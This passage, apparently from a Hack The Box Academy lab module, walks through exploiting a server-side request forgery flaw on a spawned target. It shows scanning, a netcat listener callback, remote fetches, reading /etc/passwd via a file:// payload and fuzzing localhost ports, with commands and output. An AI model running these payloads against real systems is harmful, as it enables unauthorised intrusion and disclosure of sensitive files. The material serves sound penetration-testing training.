        <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"favicon.ico"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"icon"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"image/x-icon"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"favicon.ico"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"shortcut icon"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"image/x-icon"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"tomcat.css"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"wrapper"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"navigation"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"curved container"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"nav-home"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://tomcat.apache.org/"</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"nav-hosts"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/docs/"</span>&gt;</span>Documentation<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"nav-config"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/docs/config/"</span>&gt;</span>Configuration<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"nav-examples"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/examples/"</span>&gt;</span>Examples<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"nav-wiki"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://wiki.apache.org/tomcat/FrontPage"</span>&gt;</span>Wiki<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"nav-lists"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://tomcat.apache.org/lists.html"</span>&gt;</span>Mailing Lists<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"nav-help"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://tomcat.apache.org/findhelp.html"</span>&gt;</span>Find Help<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">br</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"separator"</span> /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"asf-box"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Apache Tomcat/X.X.XX<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"upper"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"curved container"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"congrats"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"curved container"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>If you're seeing this, you've successfully installed Tomcat. Congratulations!<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span>
</code></pre>
<p>If we configure everything correctly, we will be able to access the Apache Tomcat manager using both cURL and our web browser.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/tomcat.png" alt="image"></p>
<h2 id="server-side-request-forgery-ssrf-overview">Server-Side Request Forgery (SSRF) Overview</h2>
<hr>
<p>Server-Side Request Forgery (<code>SSRF</code>) attacks, listed in the OWASP top 10, allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. To do that, we usually need to supply or modify URLs used by the target application to read or submit data. Exploiting SSRF vulnerabilities can lead to:</p>
<ul>
<li>Interacting with known internal systems</li>
<li>Discovering internal services via port scans</li>
<li>Disclosing local/sensitive data</li>
<li>Including files in the target application</li>
<li>Leaking NetNTLM hashes using UNC Paths (Windows)</li>
<li>Achieving remote code execution</li>
</ul>
<p>We can usually find SSRF vulnerabilities in applications that fetch remote resources. When hunting for SSRF vulnerabilities, we should look for:</p>
<ul>
<li>Parts of HTTP requests, including URLs</li>
<li>File imports such as HTML, PDFs, images, etc.</li>
<li>Remote server connections to fetch data</li>
<li>API specification imports</li>
<li>Dashboards including ping and similar functionalities to check server statuses</li>
</ul>
<p>{% hint style=&quot;info&quot; %}
<strong>Note</strong>: Always keep in mind that web application fuzzing should be part of any penetration testing or bug bounty hunting activity. That being said, fuzzing should not be limited to user input fields only. Extend fuzzing to parts of the HTTP request as well, such as the User-Agent.
{% endhint %}</p>
<h2 id="ssrf-exploitation-example">SSRF Exploitation Example</h2>
<hr>
<p>Let&#39;s first exploit an internet-facing web application (the target can be spawned at the bottom of this section) and then work to gain remote code execution on an internal host by chaining multiple SSRF vulnerabilities. The attack flow will be as follows:</p>
<table>
<thead>
<tr>
<th><code>[PENTESTER]</code></th>
<th><code>ðŸ –</code></th>
<th><code>[EXERCISE-TARGET]--[SSRF]</code></th>
<th><code>ðŸ –</code></th>
<th><code>[INTERNAL-WEBSERVER]--[SSRF]</code></th>
<th><code>ðŸ –</code></th>
<th><code>[LOCALHOST WEBAPP]</code></th>
<th><code>ðŸ –</code></th>
<th><code>[RCE]</code></th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>Navigate to the end of this section and click on <code>Click here to spawn the target system!</code>, then use the provided Pwnbox or a local VM with the supplied VPN key to follow along.</p>
<p>Basic reconnaissance against the host shows there are only three open ports.</p>
<p><strong>Nmap - Discovering Open Ports</strong></p>
<p>SSRF Exploitation Example</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nmap -sT -T5 <span class="hljs-comment">--min-rate=10000 -p- &lt;TARGET IP&gt;</span>

Nmap scan <span class="hljs-keyword">report</span> <span class="hljs-keyword">for</span> &lt;TARGET IP&gt;
Host <span class="hljs-keyword">is</span> up (<span class="hljs-number">0.00047</span>s latency).
<span class="hljs-keyword">Not</span> shown: <span class="hljs-number">65532</span> filtered ports
<span class="hljs-keyword">PORT</span>    STATE  SERVICE
<span class="hljs-number">22</span>/tcp  <span class="hljs-keyword">open</span>   ssh
<span class="hljs-number">80</span>/tcp  <span class="hljs-keyword">open</span>   http
<span class="hljs-number">8080</span>/tcp <span class="hljs-keyword">open</span>  http-proxy

Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">13.25</span> seconds
</code></pre>
<p>Let&#39;s issue a cURLrequest to the target server using the parameters <code>-i</code> to show the protocol response headers and <code>-s</code> to use the silent mode.</p>
<p><strong>Curl - Interacting with the Target</strong></p>
<p>SSRF Exploitation Example</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -i -s http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>

HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 242
Location: http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>/load?q=index.html
Server: Werkzeug/2.0.2 Python
Date: Mon, 18 Oct 2021 09:01:02 GMT

<span class="hljs-meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Redirecting...<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Redirecting...<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>You should be redirected automatically to target URL: <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/load?q=index.html"</span>&gt;</span>/load?q=index.html<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>. If not click the link.
</code></pre>
<p>We can see the request redirected to <code>/load?q=index.html</code>, meaning the <code>q</code> parameter fetches the resource <code>index.html</code>. Let us follow the redirect to see if we can gather any additional information.</p>
<p>SSRF Exploitation Example</p>
<pre><code class="lang-shell-session">
root@htb[/htb]$ curl -i -s -L http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>

HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 242
Location: http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>/load?q=index.html
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 10:20:27 GMT

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 153
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 10:20:27 GMT

<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-comment">&lt;!-- ubuntu-web.lalaguna.local &amp; internal.app.local load resources via q parameter --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Bad App<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>Hello World!<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>The spawned target is <code>ubuntu-web.lalaguna.local</code>, and <code>internal.app.local</code> is an application on the internal network (inaccessible from our current position).</p>
<p>The next step is to confirm if the <code>q</code> parameter is vulnerable to SSRF. If it is, we may be able to reach the internal.app.local web application by leveraging the SSRF vulnerability. We say &quot;may&quot; because a trust relationship likely exists for <code>ubuntu-web</code> to be able to reach and interact with <code>internal.app.local</code>. This type of relationship can be something as simple as a firewall rule (or even a lack of any firewall rule).</p>
<p>In one terminal, let&#39;s use Netcat to listen on port 8080, as follows.</p>
<p><strong>Netcat Listener</strong></p>
<p>SSRF Exploitation Example</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nc -nvlp <span class="hljs-number">8080</span>

listening on [any] <span class="hljs-number">8080</span> ...
</code></pre>
<p>Now, let us issue a request to the target web application with <code>http://&lt;VPN/TUN Adapter IP&gt;</code> instead of <code>index.html</code> in another terminal, as follows. <code>&lt;VPN/TUN Adapter IP&gt;</code> will either be the TUN adapter IP of Pwnbox or the TUN adapter IP of the local VM you may be using (after connecting with the supplied VPN key).</p>
<p><strong>Curl - Testing for SSRF</strong></p>
<p>SSRF Exploitation Example</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl -i -s "http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;/</span>load?q=http:<span class="hljs-comment">//&lt;VPN/TUN Adapter IP&gt;:8080"</span>

HTTP/<span class="hljs-number">1.0</span> <span class="hljs-number">200</span> OK
Content-<span class="hljs-string">Type:</span> text/html; charset=utf<span class="hljs-number">-8</span>
Content-<span class="hljs-string">Length:</span> <span class="hljs-number">0</span>
<span class="hljs-string">Server:</span> Werkzeug<span class="hljs-regexp">/2.0.2 Python/</span><span class="hljs-number">3.8</span><span class="hljs-number">.12</span>
<span class="hljs-string">Date:</span> Mon, <span class="hljs-number">18</span> Oct <span class="hljs-number">2021</span> <span class="hljs-number">12</span>:<span class="hljs-number">07</span>:<span class="hljs-number">10</span> GMT
</code></pre>
<p>We will receive the following into our Netcat listener confirming the SSRF vulnerability via a request issued by the target server using <a href="https://docs.python.org/3.8/library/urllib.html">Python-urllib</a>:</p>
<p><strong>Netcat Listener - Confirming SSRF</strong></p>
<p>SSRF Exploitation Example</p>
<pre><code class="lang-shell-session">Connection received on &lt;TARGET IP&gt; <span class="hljs-number">49852</span>
GET <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.1</span>
Accept-<span class="hljs-string">Encoding:</span> identity
<span class="hljs-string">Host:</span> &lt;VPN/TUN Adapter IP&gt;:<span class="hljs-number">8080</span>
User-<span class="hljs-string">Agent:</span> Python-urllib/<span class="hljs-number">3.8</span>
<span class="hljs-string">Connection:</span> close
</code></pre>
<p>Reading the <a href="https://docs.python.org/3.8/library/urllib.html">Python-urllib</a> documentation, we can see it supports <code>file</code>, <code>http</code> and <code>ftp</code> schemas. So, apart from issuing HTTP requests to other services on behalf of the target application, we can also read local files via the <code>file</code> schema and remote files using <code>ftp</code>.</p>
<p>We can test this functionality through the steps below:</p>
<ol>
<li>Create a file called index.html</li>
</ol>
<p>Code: html</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>SSRF<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<ol>
<li>Inside the directory where index.html is located, start an HTTP server using the following command</li>
</ol>
<p><strong>Start Python HTTP Server</strong></p>
<p>SSRF Exploitation Example</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ python3 -m http.server <span class="hljs-number">9090</span>
</code></pre>
<ol>
<li>Inside the directory where index.html is located, start an FTP Server via the following command</li>
</ol>
<p><strong>Start FTP Server</strong></p>
<p>SSRF Exploitation Example</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo pip3 install twisted
root@htb[/htb]$ sudo python3 -m twisted ftp -p <span class="hljs-number">21</span> -r .
</code></pre>
<ol>
<li>Retrieve index.html through the target application using the <code>ftp</code> schema, as follows</li>
</ol>
<p><strong>Retrieving a remote file through the target application - FTP Schema</strong></p>
<p>SSRF Exploitation Example</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -i -s <span class="hljs-string">"http://&lt;TARGET IP&gt;/load?q=ftp://&lt;VPN/TUN Adapter IP&gt;/index.html"</span>

HTTP/<span class="hljs-number">1.0</span> <span class="hljs-number">200</span> OK
Content-Type: text/html; charset=utf<span class="hljs-number">-8</span>
Content-Length: <span class="hljs-number">41</span>
<span class="hljs-symbol">Server:</span> Werkzeug/<span class="hljs-number">2.0</span><span class="hljs-number">.2</span> Python/<span class="hljs-number">3.8</span><span class="hljs-number">.12</span>
<span class="hljs-symbol">Date:</span> Tue, <span class="hljs-number">19</span> Oct <span class="hljs-number">2021</span> <span class="hljs-number">11</span>:<span class="hljs-number">21</span>:<span class="hljs-number">09</span> GMT

<span class="hljs-params">&lt;html&gt;</span>
<span class="hljs-params">&lt;/body&gt;</span>
<span class="hljs-params">&lt;a&gt;</span>SSRF<span class="hljs-params">&lt;/a&gt;</span>
<span class="hljs-params">&lt;body&gt;</span>
<span class="hljs-params">&lt;html&gt;</span>
</code></pre>
<ol>
<li>Retrieve index.html through the target application using the <code>http</code> schema, as follows</li>
</ol>
<p><strong>Retrieving a remote file through the target application - HTTP Schema</strong></p>
<p>SSRF Exploitation Example</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -i -s <span class="hljs-string">"http://&lt;TARGET IP&gt;/load?q=http://&lt;VPN/TUN Adapter IP&gt;:9090/index.html"</span>

HTTP/<span class="hljs-number">1.0</span> <span class="hljs-number">200</span> OK
Content-Type: text/html; charset=utf<span class="hljs-number">-8</span>
Content-Length: <span class="hljs-number">41</span>
<span class="hljs-symbol">Server:</span> Werkzeug/<span class="hljs-number">2.0</span><span class="hljs-number">.2</span> Python/<span class="hljs-number">3.8</span><span class="hljs-number">.12</span>
<span class="hljs-symbol">Date:</span> Tue, <span class="hljs-number">19</span> Oct <span class="hljs-number">2021</span> <span class="hljs-number">11</span>:<span class="hljs-number">26</span>:<span class="hljs-number">18</span> GMT

<span class="hljs-params">&lt;html&gt;</span>
<span class="hljs-params">&lt;/body&gt;</span>
<span class="hljs-params">&lt;a&gt;</span>SSRF<span class="hljs-params">&lt;/a&gt;</span>
<span class="hljs-params">&lt;body&gt;</span>
<span class="hljs-params">&lt;html&gt;</span>
</code></pre>
<ol>
<li>Retrieve a local file using the file schema, as follows</li>
</ol>
<p><strong>Retrieving a local file through the target application - File Schema</strong></p>
<p>SSRF Exploitation Example</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl -i -s "http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;/</span>load?q=file:<span class="hljs-comment">///etc/passwd" </span>

HTTP/<span class="hljs-number">1.0</span> <span class="hljs-number">200</span> OK
Content-<span class="hljs-string">Type:</span> text/html; charset=utf<span class="hljs-number">-8</span>
Content-<span class="hljs-string">Length:</span> <span class="hljs-number">926</span>
<span class="hljs-string">Server:</span> Werkzeug<span class="hljs-regexp">/2.0.2 Python/</span><span class="hljs-number">3.8</span><span class="hljs-number">.12</span>
<span class="hljs-string">Date:</span> Tue, <span class="hljs-number">19</span> Oct <span class="hljs-number">2021</span> <span class="hljs-number">11</span>:<span class="hljs-number">27</span>:<span class="hljs-number">17</span> GMT
<span class="hljs-symbol">
root:</span><span class="hljs-string">x:</span><span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-string">root:</span><span class="hljs-regexp">/root:/</span>bin/bash
<span class="hljs-string">daemon:</span><span class="hljs-string">x:</span><span class="hljs-number">1</span>:<span class="hljs-number">1</span>:<span class="hljs-string">daemon:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">sbin:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">bin:</span><span class="hljs-string">x:</span><span class="hljs-number">2</span>:<span class="hljs-number">2</span>:<span class="hljs-string">bin:</span><span class="hljs-regexp">/bin:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">sys:</span><span class="hljs-string">x:</span><span class="hljs-number">3</span>:<span class="hljs-number">3</span>:<span class="hljs-string">sys:</span><span class="hljs-regexp">/dev:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">sync:</span><span class="hljs-string">x:</span><span class="hljs-number">4</span>:<span class="hljs-number">65534</span>:<span class="hljs-string">sync:</span><span class="hljs-regexp">/bin:/</span>bin/sync
<span class="hljs-string">games:</span><span class="hljs-string">x:</span><span class="hljs-number">5</span>:<span class="hljs-number">60</span>:<span class="hljs-string">games:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">games:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">man:</span><span class="hljs-string">x:</span><span class="hljs-number">6</span>:<span class="hljs-number">12</span>:<span class="hljs-string">man:</span><span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/man:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">lp:</span><span class="hljs-string">x:</span><span class="hljs-number">7</span>:<span class="hljs-number">7</span>:<span class="hljs-string">lp:</span><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/lpd:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">mail:</span><span class="hljs-string">x:</span><span class="hljs-number">8</span>:<span class="hljs-number">8</span>:<span class="hljs-string">mail:</span><span class="hljs-regexp">/var/</span><span class="hljs-string">mail:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">news:</span><span class="hljs-string">x:</span><span class="hljs-number">9</span>:<span class="hljs-number">9</span>:<span class="hljs-string">news:</span><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/news:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">uucp:</span><span class="hljs-string">x:</span><span class="hljs-number">10</span>:<span class="hljs-number">10</span>:<span class="hljs-string">uucp:</span><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/uucp:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">proxy:</span><span class="hljs-string">x:</span><span class="hljs-number">13</span>:<span class="hljs-number">13</span>:<span class="hljs-string">proxy:</span><span class="hljs-regexp">/bin:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
www-<span class="hljs-string">data:</span><span class="hljs-string">x:</span><span class="hljs-number">33</span>:<span class="hljs-number">33</span>:www-<span class="hljs-string">data:</span><span class="hljs-regexp">/var/</span><span class="hljs-string">www:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">backup:</span><span class="hljs-string">x:</span><span class="hljs-number">34</span>:<span class="hljs-number">34</span>:<span class="hljs-string">backup:</span><span class="hljs-regexp">/var/</span><span class="hljs-string">backups:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">list:</span><span class="hljs-string">x:</span><span class="hljs-number">38</span>:<span class="hljs-number">38</span>:Mailing List <span class="hljs-string">Manager:</span><span class="hljs-regexp">/var/</span><span class="hljs-string">list:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">irc:</span><span class="hljs-string">x:</span><span class="hljs-number">39</span>:<span class="hljs-number">39</span>:<span class="hljs-string">ircd:</span><span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/ircd:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">gnats:</span><span class="hljs-string">x:</span><span class="hljs-number">41</span>:<span class="hljs-number">41</span>:Gnats Bug-Reporting System (admin):<span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/gnats:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">nobody:</span><span class="hljs-string">x:</span><span class="hljs-number">65534</span>:<span class="hljs-number">65534</span>:<span class="hljs-string">nobody:</span><span class="hljs-regexp">/nonexistent:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">_apt:</span><span class="hljs-string">x:</span><span class="hljs-number">100</span>:<span class="hljs-number">65534</span>::<span class="hljs-regexp">/nonexistent:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
</code></pre>
<p>Bear in mind that fetching remote HTML files can lead to Reflected XSS.</p>
<p>Remember, we only have two open ports on the target server. However, there is a possibility of internal applications existing and listening only on localhost. We can use a tool such as ffuf to enumerate these web applications by performing the following steps:</p>
<ol>
<li>Generate a wordlist containing all possible ports.</li>
</ol>
<p><strong>Generate a Wordlist</strong></p>
<p>SSRF Exploitation Example</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> {1..65535};<span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$port</span> &gt;&gt; ports.txt;<span class="hljs-keyword">done</span>
</code></pre>
<ol>
<li>Issue a cURL request to a random port to get the response size of a request for a non-existent service.</li>
</ol>
<p><strong>Curl - Interacting with the Target</strong></p>
<p>SSRF Exploitation Example</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl -i -s "http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;/</span>load?q=http:<span class="hljs-comment">//127.0.0.1:1"</span>

HTTP/<span class="hljs-number">1.0</span> <span class="hljs-number">200</span> OK
Content-<span class="hljs-string">Type:</span> text/html; charset=utf<span class="hljs-number">-8</span>
Content-<span class="hljs-string">Length:</span> <span class="hljs-number">30</span>
<span class="hljs-string">Server:</span> Werkzeug<span class="hljs-regexp">/2.0.2 Python/</span><span class="hljs-number">3.8</span><span class="hljs-number">.12</span>
<span class="hljs-string">Date:</span> Tue, <span class="hljs-number">19</span> Oct <span class="hljs-number">2021</span> <span class="hljs-number">11</span>:<span class="hljs-number">36</span>:<span class="hljs-number">25</span> GMT

[Errno <span class="hljs-number">111</span>] Connection refused
</code></pre>
<ol>
<li>Use ffuf with the wordlist and discard the responses which have the size we previously identified.</li>
</ol>
<p><strong>Port Fuzzing</strong></p>
<p>SSRF Exploitation Example</p>
<pre><code class="lang-shell-session">root@htb[/htb]<span class="hljs-formula">$ ffuf -w ./ports.txt:PORT -u "http://&lt;TARGET IP&gt;/load?q=http://127.0.0.1:PORT" -fs 30

        /'___<span class="hljs-tag">\<span class="hljs-name"> </span></span> /'___<span class="hljs-tag">\<span class="hljs-name"> </span></span>          /'___<span class="hljs-tag">\<span class="hljs-name">
</span></span>       /<span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span>_/ /<span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span>_/  __  __  /<span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span>_/
       <span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>,__<span class="hljs-tag">\<span class="hljs-name">\</span></span> <span class="hljs-tag">\<span class="hljs-name"> </span></span>,__<span class="hljs-tag">\<span class="hljs-name">/</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">/</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span>,__<span class="hljs-tag">\<span class="hljs-name">
</span></span>        <span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span>/ <span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span>/<span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name"> </span></span><span class="hljs-tag">\<span class="hljs-name">_</span></span>/
